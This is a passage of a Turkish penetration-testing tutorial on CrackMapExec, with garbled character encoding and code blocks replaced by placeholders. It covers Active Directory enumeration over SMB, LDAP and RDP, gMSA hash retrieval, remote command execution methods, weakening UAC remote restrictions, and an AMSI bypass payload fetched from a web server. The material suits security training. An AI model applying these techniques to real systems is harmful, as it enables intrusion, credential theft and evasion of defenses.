`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

